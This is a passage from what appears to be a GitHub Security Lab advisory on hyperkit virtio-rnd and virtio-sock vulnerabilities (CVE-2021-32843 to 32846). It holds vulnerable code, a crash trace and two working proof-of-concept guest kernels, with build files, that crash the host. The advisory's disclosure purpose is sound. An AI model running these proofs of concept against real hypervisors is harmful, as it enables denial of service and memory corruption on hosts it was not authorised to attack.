	<span class="k">if</span> <span class="p">(</span><span class="n">sc</span><span class="o">-&gt;</span><span class="n">vrsc_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">vq_endchains</span><span class="p">(</span><span class="n">vq</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">vq_has_descs</span><span class="p">(</span><span class="n">vq</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">vq_getchain</span><span class="p">(</span><span class="n">vq</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

		<span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">read</span><span class="p">(</span><span class="n">sc</span><span class="o">-&gt;</span><span class="n">vrsc_fd</span><span class="p">,</span> <span class="n">iov</span><span class="p">.</span><span class="n">iov_base</span><span class="p">,</span> <span class="n">iov</span><span class="p">.</span><span class="n">iov_len</span><span class="p">);</span>
		<span class="n">DPRINTF</span><span class="p">((</span><span class="s">"vtrnd: vtrnd_notify(): %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">len</span><span class="p">));</span>

		<span class="cm">/* Catastrophe if unable to read from /dev/random */</span>
		<span class="n">assert</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>

		<span class="cm">/*
		 * Release this chain and handle more
		 */</span>
		<span class="n">vq_relchain</span><span class="p">(</span><span class="n">vq</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">len</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">vq_endchains</span><span class="p">(</span><span class="n">vq</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>	<span class="cm">/* Generate interrupt if appropriate. */</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-2">Impact</h4>

<p>This issue may lead to a guest crashing the host causing a <code class="language-plaintext highlighter-rouge">denial of service</code> and under certain circumstance memory corruption.</p>

<h4 id="proof-of-concept-2">Proof of Concept</h4>

<p>The following <code class="language-plaintext highlighter-rouge">PoC</code> is a simple multiboot kernel that simulates a compromised guest. The guest must be booted with the device <code class="language-plaintext highlighter-rouge">vtrnd</code> enabled by passing <code class="language-plaintext highlighter-rouge">hyperkit</code> the command line flags <code class="language-plaintext highlighter-rouge">-s 5,virtio-rnd</code> for example.</p>

<p>In order to compile it follow the instructions in the <code class="language-plaintext highlighter-rouge">resources</code> section.</p>

<p><em>Warning:</em> In order to verify that the vulnerability exists, please attach a debugger instead of waiting for a crash because due to the nature of the vulnerability, a crash may not happen.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">outw</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">port</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm__</span> <span class="n">__volatile__</span><span class="p">(</span><span class="s">"outw %w0,%w1"</span>
                         <span class="o">:</span>
                         <span class="o">:</span> <span class="s">"a"</span><span class="p">(</span><span class="n">value</span><span class="p">),</span> <span class="s">"Nd"</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span>
<span class="nf">outl</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">port</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm__</span> <span class="n">__volatile__</span><span class="p">(</span><span class="s">"outl %0,%w1"</span>
                         <span class="o">:</span>
                         <span class="o">:</span> <span class="s">"a"</span><span class="p">(</span><span class="n">value</span><span class="p">),</span> <span class="s">"Nd"</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">vring_avail</span>
<span class="p">{</span>
    <span class="kt">uint16_t</span> <span class="n">va_flags</span><span class="p">;</span>  <span class="cm">/* VRING_AVAIL_F_* */</span>
    <span class="kt">uint16_t</span> <span class="n">va_idx</span><span class="p">;</span>    <span class="cm">/* counts to 65535, then cycles */</span>
    <span class="kt">uint16_t</span> <span class="n">va_ring</span><span class="p">[];</span> <span class="cm">/* size N, reported in QNUM value */</span>
<span class="p">};</span>

<span class="cp">#define VQ_QSIZE 0x40
</span>
<span class="kt">int</span> <span class="nf">kernel_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 0. Choose an address that is mapped but unused.</span>
    <span class="kt">uint64_t</span> <span class="n">pfn</span> <span class="o">=</span> <span class="mh">0x1000000</span><span class="p">;</span>

    <span class="c1">// 1. Select a queue.</span>
    <span class="c1">// VTCFG_R_QSEL = 0x0e</span>
    <span class="n">outw</span><span class="p">(</span><span class="mh">0x210e</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// 2. Initialize the queue to our address.</span>
    <span class="c1">// VTCFG_R_PFN = 0x08</span>
    <span class="n">outl</span><span class="p">(</span><span class="mh">0x2108</span><span class="p">,</span> <span class="n">pfn</span> <span class="o">/</span> <span class="mi">4096</span><span class="p">);</span>

    <span class="c1">// 3. Satisfy vq_has_descs and make (ndesc &gt; vq-&gt;vq_qsize) false.</span>
    <span class="k">struct</span> <span class="n">vring_avail</span> <span class="o">*</span><span class="n">avail</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vring_avail</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">pfn</span><span class="p">))[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="n">avail</span><span class="o">-&gt;</span><span class="n">va_idx</span> <span class="o">=</span> <span class="n">VQ_QSIZE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

    <span class="c1">// 4. Call pci_vtrnd_notify to trigger a vq_getchain.</span>
    <span class="c1">// VTCFG_R_QNOTIFY = 0x10</span>
    <span class="c1">// pci_emul_io_handler = 0x2100</span>
    <span class="c1">// pci_emul_io_handler | VTCFG_R_QNOTIFY</span>
    <span class="n">outw</span><span class="p">(</span><span class="mh">0x2110</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="issue-4-virtio-sock-pci_vtsock_proc_tx-uninitialized-memory-use-ghsl-2021-057">Issue 4: virtio-sock pci_vtsock_proc_tx uninitialized memory use (GHSL-2021-057)</h3>

<p>The function <code class="language-plaintext highlighter-rouge">pci_vtsock_proc_tx</code> has the same vulnerability pattern we described on issue number 3.</p>

<p><em>Vulnerable function:</em></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">pci_vtsock_proc_tx</span><span class="p">(</span><span class="k">struct</span> <span class="n">pci_vtsock_softc</span> <span class="o">*</span><span class="n">sc</span><span class="p">,</span>
			       <span class="k">struct</span> <span class="n">vqueue_info</span> <span class="o">*</span><span class="n">vq</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">pci_vtsock_sock</span> <span class="o">*</span><span class="n">sock</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov_array</span><span class="p">[</span><span class="n">VTSOCK_MAXSEGS</span><span class="p">],</span> <span class="o">*</span><span class="n">iov</span> <span class="o">=</span> <span class="n">iov_array</span><span class="p">;</span>
	<span class="kt">uint16_t</span> <span class="n">idx</span><span class="p">,</span> <span class="n">flags</span><span class="p">[</span><span class="n">VTSOCK_MAXSEGS</span><span class="p">];</span>
	<span class="k">struct</span> <span class="n">virtio_sock_hdr</span> <span class="n">hdr</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">iovec_len</span><span class="p">;</span>
	<span class="kt">size_t</span> <span class="n">pulled</span><span class="p">;</span>

	<span class="n">iovec_len</span> <span class="o">=</span> <span class="n">vq_getchain</span><span class="p">(</span><span class="n">vq</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">,</span> <span class="n">iov</span><span class="p">,</span> <span class="n">VTSOCK_MAXSEGS</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
	<span class="n">assert</span><span class="p">(</span><span class="n">iovec_len</span> <span class="o">&lt;=</span> <span class="n">VTSOCK_MAXSEGS</span><span class="p">);</span>

    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>In this situation, there is a check for the return value to be less or equal to <code class="language-plaintext highlighter-rouge">VTSOCK_MAXSEGS</code>, but that check is not sufficient because the function can return <code class="language-plaintext highlighter-rouge">-1</code> if it finds an error it cannot recover from. Moreover, the negative return value will be used by <code class="language-plaintext highlighter-rouge">iovec_pull</code> in a while condition that can further lead to more corruption because the function is not designed to handle a negative <code class="language-plaintext highlighter-rouge">iov_len</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">iovec_pull</span><span class="p">(</span><span class="k">struct</span> <span class="n">iovec</span> <span class="o">**</span><span class="n">iov</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">iov_len</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="n">bytes</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">iov_len</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">size_t</span> <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">bytes</span> <span class="o">-</span> <span class="n">res</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="o">*</span><span class="n">iov</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">?</span> <span class="p">(</span><span class="n">bytes</span> <span class="o">-</span> <span class="n">res</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="o">*</span><span class="n">iov</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span><span class="p">;</span>

		<span class="c1">//DPRINTF(("Copy %zd/%zd bytes from base=%p to buf=%p\n",</span>
		<span class="c1">//	 c, (*iov)[0].iov_len, (void*)(*iov)[0].iov_base, (void*)buf));</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="o">*</span><span class="n">iov</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>

		<span class="p">(</span><span class="o">*</span><span class="n">iov</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">-=</span> <span class="n">c</span><span class="p">;</span>
		<span class="p">(</span><span class="o">*</span><span class="n">iov</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">iov</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">+</span> <span class="n">c</span><span class="p">;</span>

		<span class="c1">//DPRINTF(("iov %p is now %zd bytes at %p\n", (void *)*iov,</span>
		<span class="c1">//	 (*iov)[0].iov_len, (void *)(*iov)[0].iov_base));</span>

		<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">iov</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="p">(</span><span class="o">*</span><span class="n">iov</span><span class="p">)</span><span class="o">++</span><span class="p">;</span>
			<span class="p">(</span><span class="o">*</span><span class="n">iov_len</span><span class="p">)</span><span class="o">--</span><span class="p">;</span>
			<span class="c1">//DPRINTF(("iov elem consumed, now iov=%p, iov_len=%d\n", (void *)*iov, *iov_len));</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">+</span> <span class="n">c</span><span class="p">;</span>
		<span class="c1">//DPRINTF(("buf now %p\n", (void *)buf));</span>

		<span class="n">res</span> <span class="o">+=</span> <span class="n">c</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="c1">//DPRINTF(("iovec_pull pulled %zd/%zd bytes\n", res, bytes));</span>

	<span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><em>Host crashing:</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Launching: /Users/goose/workspace/hyperkit/build/hyperkit -A -b -c 2 -s 0:0,hostbridge -s 1,uart -s 4,virtio-blk,disk.img -s 5,virtio-rnd -s 31,lpc -s 7,virtio-sock,guest_cid=3,path=/tmp/hyperkit,guest_forwards=2375 -l com1,stdio -f multiboot,/Users/goose/workspace/hype-r-kernel/build/poc
Launched process 5474
Stop reason: EXC_BAD_ACCESS (code=1, address=0xc)
bt
* thread #4, name = 'vsock:tx', stop reason = EXC_BAD_ACCESS (code=1, address=0xc)
  * frame #0: 0x00000001003eb4d5 libclang_rt.asan_osx_dynamic.dylib`__sanitizer::internal_memmove(void*, void const*, unsigned long) + 373
    frame #1: 0x00000001003aadf0 libclang_rt.asan_osx_dynamic.dylib`wrap_memmove + 736
    frame #2: 0x000000010003ab22 hyperkit`iovec_pull(iov=0x000070000403aa00, iov_len=0x000070000403aa44, buf=0x000070000403aa08, bytes=44) at pci_virtio_sock.c:451:12 [opt]
    frame #3: 0x000000010003a3d9 hyperkit`pci_vtsock_proc_tx(sc=0x0000000114348800, vq=0x00000001143488c0) at pci_virtio_sock.c:1132:11 [opt]
    frame #4: 0x0000000100037e2f hyperkit`pci_vtsock_tx_thread(vsc=0x0000000114348800) at pci_virtio_sock.c:1609:4 [opt]
    frame #5: 0x00007fff205f6950 libsystem_pthread.dylib`_pthread_start + 224
    frame #6: 0x00007fff205f247b libsystem_pthread.dylib`thread_start + 15
</code></pre></div></div>

<h4 id="impact-3">Impact</h4>

<p>This issue may lead to a guest crashing the host causing a <code class="language-plaintext highlighter-rouge">denial of service</code> and under certain circumstance memory corruption.</p>

<h4 id="proof-of-concept-3">Proof of Concept</h4>

<p>The following <code class="language-plaintext highlighter-rouge">PoC</code> is a simple multiboot kernel that simulates a compromised guest. The guest must be booted with the device <code class="language-plaintext highlighter-rouge">vtrnd</code> enabled by passing <code class="language-plaintext highlighter-rouge">hyperkit</code> the command line flags <code class="language-plaintext highlighter-rouge">-s 5,virtio-rnd</code> for example.</p>

<p>In order to compile it follow the instructions in the <code class="language-plaintext highlighter-rouge">resources</code> section.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">outw</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">port</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm__</span> <span class="n">__volatile__</span><span class="p">(</span><span class="s">"outw %w0,%w1"</span>
                         <span class="o">:</span>
                         <span class="o">:</span> <span class="s">"a"</span><span class="p">(</span><span class="n">value</span><span class="p">),</span> <span class="s">"Nd"</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span>
<span class="nf">outl</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">port</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm__</span> <span class="n">__volatile__</span><span class="p">(</span><span class="s">"outl %0,%w1"</span>
                         <span class="o">:</span>
                         <span class="o">:</span> <span class="s">"a"</span><span class="p">(</span><span class="n">value</span><span class="p">),</span> <span class="s">"Nd"</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">vring_avail</span>
<span class="p">{</span>
    <span class="kt">uint16_t</span> <span class="n">va_flags</span><span class="p">;</span>  <span class="cm">/* VRING_AVAIL_F_* */</span>
    <span class="kt">uint16_t</span> <span class="n">va_idx</span><span class="p">;</span>    <span class="cm">/* counts to 65535, then cycles */</span>
    <span class="kt">uint16_t</span> <span class="n">va_ring</span><span class="p">[];</span> <span class="cm">/* size N, reported in QNUM value */</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">kernel_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 0. Choose an address that is mapped but unused.</span>
    <span class="kt">uint64_t</span> <span class="n">pfn</span> <span class="o">=</span> <span class="mh">0x1000000</span><span class="p">;</span>

    <span class="c1">// 1. Select a queue.</span>
    <span class="c1">// VTCFG_R_QSEL = 0x0e</span>
    <span class="n">outw</span><span class="p">(</span><span class="mh">0x212e</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="c1">// 2. Initialize the queue to our address.</span>
    <span class="c1">// VTCFG_R_PFN = 0x08</span>
    <span class="n">outl</span><span class="p">(</span><span class="mh">0x2128</span><span class="p">,</span> <span class="n">pfn</span> <span class="o">/</span> <span class="mi">4096</span><span class="p">);</span>

    <span class="c1">// 3. Satisfy vq_has_descs and make (ndesc &gt; vq-&gt;vq_qsize) false.</span>
    <span class="k">struct</span> <span class="n">vring_avail</span> <span class="o">*</span><span class="n">vq_avail</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">vring_avail</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">pfn</span><span class="p">))[</span><span class="mh">0x400</span><span class="p">];</span>
    <span class="n">vq_avail</span><span class="o">-&gt;</span><span class="n">va_idx</span> <span class="o">=</span> <span class="mi">257</span><span class="p">;</span>

    <span class="c1">// 4. Call pci_vtsock_proc_tx to trigger a vq_getchain.</span>
    <span class="n">outw</span><span class="p">(</span><span class="mh">0x2120</span> <span class="o">|</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="resources">Resources</h3>

<p>In order to compile each proof of concept code, place the code into a C file in a directory along with the provided files <code class="language-plaintext highlighter-rouge">linker.ld</code> and <code class="language-plaintext highlighter-rouge">start.s</code>. You will also need to install <code class="language-plaintext highlighter-rouge">nasm</code> and <code class="language-plaintext highlighter-rouge">i686-elf-gcc</code>:</p>

<p><em>Compilation:</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Install compilation dependencies.</span>
brew <span class="nb">install </span>nasm i686-elf-gcc

<span class="c"># Compile the kernel into a file named `poc`.</span>
nasm <span class="nt">-felf32</span> <span class="nt">-w</span>+all <span class="nt">-o</span> start.o start.s
i686-elf-gcc <span class="nt">-std</span><span class="o">=</span>c17 <span class="nt">-Wall</span> <span class="nt">-ffreestanding</span> <span class="nt">-O0</span> <span class="nt">-nostdlib</span> <span class="nt">-Wno-unused-function</span> <span class="nt">-c</span> poc.c <span class="nt">-o</span> poc.o
i686-elf-gcc <span class="nt">-std</span><span class="o">=</span>c17 <span class="nt">-Wall</span> <span class="nt">-ffreestanding</span> <span class="nt">-O0</span> <span class="nt">-nostdlib</span> <span class="nt">-Wno-unused-function</span> <span class="nt">-T</span> linker.ld start.o poc.o <span class="nt">-o</span> poc <span class="nt">-lgcc</span>
</code></pre></div></div>

<p><em>linker.ld</em></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENTRY(start)
 
SECTIONS
{
    . = 1M;

    .multiboot BLOCK(4K) : ALIGN(4K)
    {
        *(.multiboot)
    }

    .text BLOCK(4K) : ALIGN(4K)
    {
        *(.text)
    }
  
    .data BLOCK(4K) : ALIGN(4K)
    {
        *(.data)
    }
 
    .rodata BLOCK(4K) : ALIGN(4K)
    {
        *(.rodata)
    }

    .bss BLOCK(4K) : ALIGN(4K)
    {
        *(.common)
        *(.bss)
    } 
}
</code></pre></div></div>

<p><em>start.s</em></p>

<div class="language-s highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">KERNEL_STACK_SIZE</span><span class="w"> </span><span class="n">equ</span><span class="w"> </span><span class="mh">0x4000</span><span class="w">

</span><span class="p">[</span><span class="n">section</span><span class="w"> </span><span class="n">.multiboot</span><span class="p">]</span><span class="w">
    </span><span class="n">MB_MODULEALIGN</span><span class="w">  </span><span class="n">equ</span><span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="m">0</span><span class="w">
    </span><span class="n">MB_MEMINFO</span><span class="w">      </span><span class="n">equ</span><span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="m">1</span><span class="w">
    </span><span class="n">MB_FLAGS</span><span class="w">        </span><span class="n">equ</span><span class="w">  </span><span class="n">MB_MODULEALIGN</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MB_MEMINFO</span><span class="w">
    </span><span class="n">MB_MAGIC</span><span class="w">        </span><span class="n">equ</span><span class="w">  </span><span class="mh">0x1BADB002</span><span class="w">
    </span><span class="n">MB_CHECKSUM</span><span class="w">     </span><span class="n">equ</span><span class="w"> </span><span class="o">-</span><span class="p">(</span><span class="n">MB_MAGIC</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">MB_FLAGS</span><span class="p">)</span><span class="w">

    </span><span class="n">multiboot_header</span><span class="o">:</span><span class="w">
        </span><span class="n">dd</span><span class="w"> </span><span class="n">MB_MAGIC</span><span class="w">
        </span><span class="n">dd</span><span class="w"> </span><span class="n">MB_FLAGS</span><span class="w">
        </span><span class="n">dd</span><span class="w"> </span><span class="n">MB_CHECKSUM</span><span class="w">

</span><span class="p">[</span><span class="n">section</span><span class="w"> </span><span class="n">.text</span><span class="p">]</span><span class="w">
    </span><span class="n">start</span><span class="o">:</span><span class="w">
        </span><span class="n">global</span><span class="w"> </span><span class="n">start</span><span class="w">
        </span><span class="n">lgdt</span><span class="w"> </span><span class="p">[</span><span class="n">gdt_temp_r</span><span class="p">]</span><span class="w">
        </span><span class="n">mov</span><span class="w"> </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="w">
        </span><span class="n">mov</span><span class="w"> </span><span class="n">ds</span><span class="p">,</span><span class="w"> </span><span class="n">ax</span><span class="w">
        </span><span class="n">mov</span><span class="w"> </span><span class="n">es</span><span class="p">,</span><span class="w"> </span><span class="n">ax</span><span class="w">
        </span><span class="n">mov</span><span class="w"> </span><span class="n">ss</span><span class="p">,</span><span class="w"> </span><span class="n">ax</span><span class="w">
        </span><span class="n">jmp</span><span class="w"> </span><span class="mh">0x08</span><span class="o">:</span><span class="n">kernel_entry</span><span class="w">

    </span><span class="n">kernel_entry</span><span class="o">:</span><span class="w">
        </span><span class="n">mov</span><span class="w"> </span><span class="n">esp</span><span class="p">,</span><span class="w"> </span><span class="n">kernel_stack</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">KERNEL_STACK_SIZE</span><span class="w">
        </span><span class="n">mov</span><span class="w"> </span><span class="n">ebp</span><span class="p">,</span><span class="w"> </span><span class="n">esp</span><span class="w">
        </span><span class="n">extern</span><span class="w"> </span><span class="n">kernel_main</span><span class="w">
        </span><span class="n">call</span><span class="w"> </span><span class="n">kernel_main</span><span class="w">
        </span><span class="n">jmp</span><span class="w"> </span><span class="o">$</span><span class="w">

</span><span class="p">[</span><span class="n">section</span><span class="w"> </span><span class="n">.data</span><span class="p">]</span><span class="w">
    </span><span class="n">gdt_temp</span><span class="o">:</span><span class="w">
        </span><span class="n">dq</span><span class="w"> </span><span class="mh">0x0000000000000000</span><span class="w">
        </span><span class="n">dq</span><span class="w"> </span><span class="mh">0x00cf9a000000ffff</span><span class="w">
        </span><span class="n">dq</span><span class="w"> </span><span class="mh">0x00cf92000000ffff</span><span class="w">

    </span><span class="n">gdt_temp_end</span><span class="o">:</span><span class="w">
    </span><span class="n">gdt_temp_r</span><span class="o">:</span><span class="w">
        </span><span class="n">dw</span><span class="w"> </span><span class="n">gdt_temp_end</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">gdt_temp</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m">1</span><span class="w">
        </span><span class="n">dd</span><span class="w"> </span><span class="n">gdt_temp</span><span class="w">

</span><span class="p">[</span><span class="n">section</span><span class="w"> </span><span class="n">.bss</span><span class="p">]</span><span class="w">
    </span><span class="n">align</span><span class="w"> </span><span class="m">32</span><span class="w">
    </span><span class="n">kernel_stack</span><span class="o">:</span><span class="w">
          </span><span class="n">resb</span><span class="w"> </span><span class="n">KERNEL_STACK_SIZE</span><span class="w">
</span></code></pre></div></div>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-32843</li>
  <li>CVE-2021-32844</li>
  <li>CVE-2021-32845</li>
  <li>CVE-2021-32846</li>
</ul>

<h2 id="resources-1">Resources</h2>

<ul>
  <li>https://github.com/moby/hyperkit/pull/313</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/agustingianni">@agustingianni (Agustin Gianni)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-YEAR-ID</code> in any communication regarding this issue.</p>


    </main>
  </div>

  <div></div>


  <footer class="sc-dVhcbM cBEMHy footer">
  <div class="container-xl py-10">
    <div class="d-flex flex-wrap flex-lg-nowrap flex-md-nowrap ">
      <div class="col-12 col-lg-5 mb-5">
        <a
          href="https://github.com/"
          data-ga-click="Footer, go to home, text:home"
          class="octicon-text-white"
          aria-label="Go to GitHub homepage"
        >
          <svg
            height="30"
            class="octicon octicon-logo-github"
            viewBox="0 0 45 16"
            version="1.1"
            width="84"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 00-.146-.18zM42.23 9.84c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 